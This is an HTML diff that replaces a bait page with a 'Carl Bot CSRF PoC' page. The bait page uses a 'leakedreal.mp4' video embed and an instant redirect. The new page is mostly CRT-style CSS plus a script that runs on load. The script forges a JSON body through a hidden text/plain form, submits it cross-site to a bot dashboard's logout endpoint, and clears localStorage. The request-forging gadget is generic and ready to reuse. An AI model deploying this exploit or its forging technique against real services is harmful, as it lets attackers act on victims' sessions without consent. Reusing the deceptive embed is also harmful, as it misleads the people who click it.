@@ -1,23 +1,159 @@
-<!DOCTYPE html>
-<html>
-  <head>
 
-    <!-- Thumbnail image/gif -->
-    <meta property="og:image" content="https://raw.githubusercontent.com/lolthatseazy/media-files/main/media/catgirl-anime.gif">
-    <meta property="og:type" content="video.other">
-    
-    <!-- Video Link -->
-    <meta property="og:video:url" content="https://raw.githubusercontent.com/lolthatseazy/yahahaha/main/media/leakedreal.mp4">
-    <!-- If you want a seamless transition between your thumbnail size and video size, adjust these values to match your thumbnail resolution. -->
-    <!-- However, it will be all wonky if your thumbnail is vertical and your video is horizontal. This works best with similar aspect ratios -->
-    <meta property="og:video:height" content="202">
-    <meta property="og:video:width" content="250">
-    
-    <!-- Stole the memes from https://github.com/iwakkrg/iwakkrg.github.io -->
-    
-    <!-- Redirect -->
-    <meta http-equiv="refresh" content="0; url=https://www.youtube.com/@daddyfaster" />
-  </head>
-  <body>
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Carl Bot CSRF PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* https://dev.to/ekeijl/retro-crt-terminal-screen-in-css-js-4afh */
+        body {
+            margin: 0px;
+            padding: 0px;
+            background-color: black;
+            color: white;
+            font-family: monospace;
+            overflow-x: hidden;
+        }
+
+        textarea {
+            background-color: transparent;
+            resize: none;
+            border: none;
+            color: white;
+        }
+
+        img {
+            image-rendering: pixelated;
+        }
+
+        #crt:before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+
+            right: 0;
+            background: linear-gradient(to bottom,
+                    rgba(18, 16, 16, 0) 50%,
+                    rgba(0, 0, 0, 0.25) 50%);
+            background-size: 100% 2px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        @keyframes textShadow {
+            0% {
+                text-shadow: 0.4389924193300864px 0 1px rgba(0, 30, 255, 0.5), -0.4389924193300864px 0 1px rgba(255, 0, 80, 0.3), 0 0 3px;
+            }
+
+            5% {
+                text-shadow: 2.7928974010788217px 0 1px rgba(0, 30, 255, 0.5), -2.7928974010788217px 0 1px rgba(255, 0, 80, 0.3), 0 0 3px;
+            }
+
+            /** etc */
+        }
+
+        .scanline {
+            width: 100%;
+            height: 100px;
+            z-index: 8;
+            background: linear-gradient(0deg,
+                    rgba(0, 0, 0, 0) 0%,
+                    rgba(247, 145, 243, 0.6) 0%,
+                    rgba(0, 0, 0, 0.1) 100%);
+            opacity: 0.2;
+            position: absolute;
+            bottom: 100%;
+            animation: scanline 10s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% {
+                bottom: 100%;
+            }
+
+            100% {
+                bottom: 0%;
+            }
+        }
+
+
+        .gradient {
+            font-size: larger;
+            font-weight: bolder;
+            width: max-content;
+            background: linear-gradient(90deg, rgba(2, 0, 36, 1) 0%, rgba(255, 191, 252, 1) 0%, rgba(249, 81, 255, 1) 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .content {
+            padding: 1rem;
+        }
+
+        a :hover {
+            margin: -1px;
+            border: 1px solid #fff;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="crt">
+        <div class="scanline"></div>
+
+        <div class="content">
+            <h1>Carl Bot CSRF PoC</h1>
+            <textarea style="font-family: monospace;" rows="10" cols="50" id="logarea" readonly></textarea>
+            <form id="form" method="GET" action="" enctype="text/plain">
+                <input id="json" type="hidden" name="" value='":"bar"}' />
+            </form>
+
+            <div style="display: flex; flex-direction: column; margin-top: 1rem; gap: 0.4rem;">
+                <span class="gradient">Made <span style="background: none; color: white; font-size: small;">(and
+                        found)</span>
+                    by: </span>
+                <a href="https://kibty.town">
+                    <img src="https://kibty.town/img/buttons/kibty.town-badge.gif" alt="kibty.town">
+                </a>
+            </div>
+        </div>
+
+    </div>
+</body>
+<script>
+    function exploit() {
+        send(`https://byfron.xyz/dash/logout`, "GET", {
+           
+        })
+        cleanup()
+
+    }
+
+    const SUFFIX = ",\"foo"
+    function send(url, method, data) {
+        form.action = url
+        form.method = method
+        let jsonStr = JSON.stringify(data)
+        jsonStr = jsonStr.substring(0, jsonStr.length - 1) + SUFFIX
+        json.name = jsonStr
+
+        form.submit()
+
+
+    }
+
+    function cleanup() {
+        localStorage.removeItem("guild")
+        localStorage.removeItem("channel")
+        localStorage.removeItem("log")
+    }
+
+    exploit()
+</script>
+
 </html>
